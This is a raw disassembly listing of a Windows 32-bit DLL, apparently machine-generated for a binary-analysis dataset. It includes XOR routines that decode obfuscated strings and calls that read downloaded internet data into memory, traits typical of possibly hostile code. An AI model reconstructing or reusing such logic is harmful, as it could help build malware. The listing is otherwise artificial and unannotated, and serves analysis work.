mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_1004d73d
jmp r-xdata
sub_1000329e
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10003330
push ebp
mov ebp esp
push 0xffffffff
push sub_100821bc
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi ] r--data
mov edx [ edi ]
lea ecx [ esi + 0xc ]
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx ] ax
mov eax edx
lea ebx [ eax + 0x2 ]
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x88 ] ebx
lea ebx [ ebx ]
mov bx [ eax ]
add eax 0x2
test bx bx
jne r-xdata
sub eax [ ebp - 0x88 ]
sar eax 0x1
push eax
push edx
call sub_100531b0
xor edx edx
mov [ ebp - 0x4 ] edx
mov eax [ edi + 0x20 ]
mov [ esi + 0x28 ] eax
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] edx
mov [ esi + 0x2c ] cx
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x4c ] edx
mov eax [ edi + 0x2c ]
mov [ esi + 0x50 ] eax
mov ecx [ edi + 0x28 ]
mov [ esi + 0x54 ] ecx
mov eax [ edi + 0x24 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x4c ]
mov [ esi + 0x5c ] ecx
mov eax [ edi + 0x48 ]
mov [ esi + 0x60 ] eax
mov ecx [ r--data ]
xor eax eax
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xfffb
and ebx 0xff
mov [ ebp + eax * 2 - 0x50 ] bx
inc eax
cmp eax 0x8
jb r-xdata
xor ecx ecx
mov [ ebp - 0x40 ] cx
mov ecx [ r--data ]
xor eax eax
lea ecx [ ecx ]
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0x5c
and ebx 0xff
mov [ ebp + eax * 2 - 0x84 ] bx
inc eax
cmp eax 0xc
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6c ] ax
lea esp [ esp ]
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0xff8e
and ebx 0xff
mov [ ebp + eax * 2 - 0x2c ] bx
inc eax
cmp eax 0x7
jb r-xdata
xor ecx ecx
mov [ ebp - 0x1e ] cx
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx ebx [ eax + ecx ]
xor ebx eax
xor ebx 0x42
and ebx 0xff
mov [ ebp + eax * 2 - 0x3c ] bx
inc eax
cmp eax 0x7
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x2e ] ax
movsx ebx [ ecx + eax ]
xor ebx eax
xor ebx 0x25
and ebx 0xff
mov [ ebp + eax * 2 - 0x1c ] bx
inc eax
cmp eax 0x5
jb r-xdata
xor ecx ecx
mov [ ebp - 0x12 ] cx
mov ecx [ r--data ]
xor eax eax
mov edi edi
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff90
and edx 0xff
mov [ ebp + eax * 2 - 0x68 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ lstrcmpW@IAT ]
xor eax eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x54 ] ax
mov eax [ edi + 0x1c ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x3c ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x1
jmp r-xdata
mov eax [ edi + 0x1c ]
lea ecx [ ebp - 0x84 ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x2
jmp r-xdata
mov edx [ edi + 0x8 ]
mov eax edx
lea ebx [ eax + 0x2 ]
mov edi edi
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x50 ]
push edx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x3
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax ebx
sar eax 0x1
push eax
push edx
lea ecx [ esi + 0x2c ]
call sub_100531b0
mov eax [ edi + 0x40 ]
mov [ esi + 0x68 ] eax
mov ecx [ edi + 0x44 ]
mov [ esi + 0x6c ] ecx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x1c ]
lea ecx [ ebp - 0x1c ]
push ecx
push eax
call ebx
test eax eax
jne r-xdata
mov [ esi + 0x48 ] 0x4
jmp r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x68 ]
push edx
push eax
call ebx
neg eax
sbb eax eax
and eax 0xfffffffa
add eax 0x6
mov [ esi + 0x48 ] eax
mov [ esi + 0x48 ] 0x5
jmp r-xdata
sub_100035d1
push 0x34
mov eax sub_1007fde7
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x3c ] edi
add edi 0x8
push edi
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x18 ]
push 0x0
push 0x30
mov [ ebp - 0x38 ] eax
call sub_1003088d
add esp 0xc
cmp [ esi + 0x14 ] 0x8
movzx ebx ax
jb r-xdata
push edi
xor edi edi
push edi
push 0x2d
mov [ ebp - 0x34 ] 0x0
call sub_1003088d
add esp 0xc
cmp [ esi ] ax
jne r-xdata
mov esi [ esi ]
movzx eax [ esi ]
cmp bx ax
ja r-xdata
mov [ ebp - 0x34 ] 0x1
add esi 0x2
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1005ad19
and [ ebp - 0x4 ] 0x0
test edi edi
jne r-xdata
lea ecx [ ebx + 0x9 ]
sub esp 0x1c
lea eax [ ebp - 0x2c ]
mov ecx esp
mov [ ebp - 0x40 ] esp
push eax
call sub_100154d5
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x3c ]
push [ ebp + 0x1c ]
push [ ebp - 0x38 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x30 ]
call sub_1004071e
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000aecf
mov eax [ ebp - 0x30 ]
call sub_1004fa89
retn 0x1c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100550c4
inc edi
movzx eax [ esi + edi * 2 ]
cmp bx ax
jbe r-xdata
movzx eax ax
cmp eax ecx
jg r-xdata
sub_100036b0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x0
push 0x0
lea edx [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ecx ]
push edx
push eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call [ InternetQueryDataAvailable@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ebx [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
mov edi [ ecx ]
push 0x401
push 0x0
mov [ ebp + 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
lea edx [ ebp + 0x8 ]
push edx
mov esi eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push 0x400
push esi
push ecx
call [ InternetReadFile@IAT ]
mov edx [ ebp + 0x8 ]
mov [ esi + edx ] 0x0
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
inc eax
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebx ]
lea ecx [ eax + edi + 0x1 ]
push ecx
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
inc ecx
push ecx
mov edx eax
add edx edi
push 0x0
push edx
mov [ ebx ] eax
call sub_10079a10
mov eax [ ebp + 0x8 ]
mov ecx [ ebx ]
push eax
add ecx edi
push esi
push ecx
call sub_100796a0
add esp 0x18
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
add [ eax ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push edx
call [ InternetQueryDataAvailable@IAT ]
test eax eax
jne r-xdata
sub_100037e0
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x90 ] edi
call sub_10052680
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x80 ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x84 ]
mov [ ebp - 0x84 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x84 ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0x5c
call sub_100050e0
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x88 ]
push edx
mov [ ebp - 0x88 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x88 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x2a
lea edx [ ebp - 0x8c ]
mov [ ebp - 0x8c ] ebx
call sub_1005b4f0
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x84 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x8c ]
mov eax [ ebp - 0x90 ]
push esi
add eax 0x128
call sub_10058fc0
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0x1a
jmp r-xdata
mov eax [ ebp - 0x88 ]
cmp eax ebx
je r-xdata
call sub_10021ec0
jmp r-xdata
call sub_100050e0
sub_10003960
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi eax
cmp esi eax
je r-xdata
mov [ ebp + 0xc ] esi
cmp esi eax
jne r-xdata
movsx eax [ esi ]
push eax
call [ ebp + 0x14 ]
add esp 0x4
test eax eax
jne r-xdata
mov edi esi
inc esi
push ebx
mov ebx eax
cmp esi eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] esi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
inc esi
cmp esi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
mov [ eax ] edi
pop edi
pop esi
pop ebp
retn
movsx ecx [ esi ]
push ecx
call [ ebp + 0x14 ]
add esp 0x4
test eax eax
jne r-xdata
inc esi
cmp esi ebx
jne r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc edi
sub_100039c3
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100492ed
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10006102
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_10003a04
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push 0x0
push 0x1
call sub_1000aecf
cmp [ esi + 0x14 ] 0x8
jae r-xdata
mov eax [ esi ]
mov [ edi ] eax
and [ esi ] 0x0
mov eax [ esi + 0x10 ]
lea eax [ eax + eax + 0x2 ]
push eax
push esi
push edi
call sub_10078db0
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x14 ]
mov [ edi + 0x14 ] eax
and [ esi + 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
sub_10003a70
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
add ecx 0x8
push ecx
mov [ edi ] eax
mov edx [ ebx ]
push ebx
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x10 ] edx
call sub_100177a8
mov esi eax
add esp 0x10
test esi esi
jg r-xdata
mov eax [ edi ]
mov ecx [ ebp + 0x10 ]
dec esi
sub ecx eax
cmp ecx esi
jge r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x10
test esi esi
jle r-xdata
mov edx [ ebp - 0x10 ]
pop edi
pop esi
mov [ ebx ] edx
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x10
push esi
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_100796a0
add esp 0xc
add [ edi ] esi
sub_10003b16
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
call [ GetStringTypeW@IAT ]
movsx ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax ecx
leave
retn
sub_10003b3a
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100612be
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
sub_10003bb0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x71c71c7
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10008757
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_1000bd19
lea eax [ ecx + ecx * 8 ]
add eax eax
add eax eax
push eax
call sub_10055606
add esp 0x4
test eax eax
jne r-xdata
sub_10003c04
push 0x10
mov eax sub_1007ffbb
call sub_100097c8
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_1001b110
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_10069ce0
mov esi [ ebp + 0x28 ]
mov ebx [ ebp + 0x20 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
jmp r-xdata
cmp al 0x20
je r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004db01
retn 0x24
or [ ebx ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
mov al [ ebp + 0x11 ]
cmp al [ esi ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
movzx eax [ ebp + 0x11 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0x10 ]
test [ ecx + eax * 2 ] 0x48
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10004056
or [ ebx ] 0x2
lea ecx [ ebp + 0xc ]
call sub_10066573
lea ecx [ ebp + 0xc ]
call sub_10066573
sub_10003d04
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_1007dd93
mov [ rw-data ] 0x1
call sub_1005f1c4
pop ecx
sub_10003d30
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
cmp ebx 0x7ffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_1002c5ed
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x10 ]
push eax
push ebx
call sub_1004d170
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
test ebx ebx
jne r-xdata
cmp ebx 0x8
jae r-xdata
xor ecx ecx
cmp ecx ebx
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov [ esi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
push edi
mov edi [ esi + 0x10 ]
cmp ebx edi
jae r-xdata
xor eax eax
mov [ esi ] ax
mov esi [ esi ]
cmp eax 0x8
jb r-xdata
mov edi ebx
xor edx edx
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0x7
xor ecx ecx
mov [ esi + edi * 2 ] dx
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_1006591f
mov ebx [ ebp + 0x8 ]
add esp 0x4
lea ecx [ edi + edi ]
push ecx
push ebx
push esi
call sub_100796a0
add esp 0xc
sub_10003df0
push ebp
mov ebp esp
push 0xffffffff
push sub_100831b3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x90 ] ecx
lea edi [ ebp - 0x90 ]
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x94 ] edx
mov [ ebp - 0x88 ] eax
call sub_100545a0
xor edi edi
cmp eax edi
je r-xdata
push 0x2c
call sub_10055606
add esp 0x4
cmp eax edi
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x115
call sub_10013830
lea eax [ edi + 0x1 ]
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0x90 ]
mov edx [ ebp - 0x8c ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x14 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x20 ] edi
mov [ eax + 0x24 ] edi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
lea esi [ ebp - 0x24 ]
call sub_1002fea0
mov esi [ ebp - 0x88 ]
mov ebx eax
mov [ ebp - 0x4 ] edi
call sub_100308c0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x49
call sub_10013830
mov eax 0x2
jmp r-xdata
mov [ rw-data ] eax
call sub_10012760
test eax eax
je r-xdata
mov esi [ rw-data ]
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] edi
cmp esi edi
je r-xdata
mov edi [ ebp - 0x20 ]
call sub_10020290
mov eax [ ebp - 0x24 ]
push eax
call sub_1006591f
add esp 0x4
xor edi edi
lea edx [ ebp - 0x24 ]
mov eax 0xb6
mov [ rw-data ] edi
call sub_10013830
mov eax [ ebp - 0x88 ]
mov esi [ eax ]
cmp esi [ eax + 0x4 ]
je r-xdata
call sub_10001330
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
lea ecx [ ebp - 0x24 ]
push ecx
mov edi eax
mov eax [ esi + 0x10 ]
mov ecx esi
call sub_10039b60
test eax eax
je r-xdata
mov eax [ esi + 0x20 ]
mov esi [ esi + 0x1c ]
shr eax 0x1
xor ecx ecx
push eax
mov [ ebp - 0x84 ] cx
push esi
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] 0x0
call sub_100531b0
mov ecx [ ebp - 0x94 ]
lea edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10036380
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
mov edx [ ebp - 0x88 ]
add esi 0x24
cmp esi [ edx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1006591f
add esp 0x4
xor edi edi
jmp r-xdata
sub_10004005
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_10004030
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x20 ]
mov edx [ esi + 0x24 ]
mov [ esi ] eax
mov eax [ esi + 0x28 ]
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] edx
mov [ esi + 0x1c ] eax
call sub_10078790
pop esi
pop ebp
retn
sub_10004056
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
call sub_10037ef0
cmp eax 0xffffffff
je r-xdata
mov [ esi + 0x5 ] al
jmp r-xdata
mov al [ esi + 0x5 ]
mov [ esi + 0x4 ] 0x1
pop esi
retn
sub_1000407c
push 0x4c
mov eax sub_10080215
call sub_1001bb6b
mov eax [ ebp + 0x20 ]
mov edx [ ebp + 0x28 ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x24 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x50 ] edx
call sub_1006bd99
lea eax [ ebp + 0x14 ]
xor ebx ebx
push eax
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
call sub_1003b7cf
test al al
je r-xdata
cmp [ ebp - 0x1c ] ebx
jne r-xdata
or [ edi ] 0x1
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
push [ ebp - 0x1c ]
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10027f70
mov eax [ ebp - 0x2c ]
xor esi esi
cmp [ ebp - 0x18 ] 0x10
jae r-xdata
or [ edi ] 0x2
jmp r-xdata
cmp [ eax ] 0x30
jl r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
call sub_10041a20
mov eax esi
call sub_1004fa89
retn 0x24
xor esi esi
push 0x2d
inc esi
push esi
lea ecx [ ebp - 0x48 ]
call sub_1003f510
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp esi [ ebp - 0x1c ]
jb r-xdata
cmp [ eax ] 0x39
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x34 ] 0x10
mov esi [ ebp - 0x48 ]
jae r-xdata
movzx eax [ eax + esi ]
push eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1003f510
inc esi
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x4c ]
push eax
push ebx
lea eax [ ebp - 0x54 ]
push eax
push esi
mov [ ebp - 0x4c ] ebx
call sub_1003c6eb
add esp 0x10
cmp [ ebp - 0x54 ] esi
je r-xdata
lea esi [ ebp - 0x48 ]
or [ edi ] 0x2
fstp st0
cmp [ ebp - 0x4c ] ebx
jne r-xdata
mov eax [ ebp - 0x50 ]
fstp [ eax ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
mov esi [ ebp - 0x58 ]
sub_100041d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10083788
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov edi edx
xor esi esi
xor edx edx
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x30 ] dx
lea eax [ ebp - 0x30 ]
push eax
push edi
mov [ ebp - 0x4 ] esi
call sub_1003bef0
test eax eax
je r-xdata
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x60 ] esi
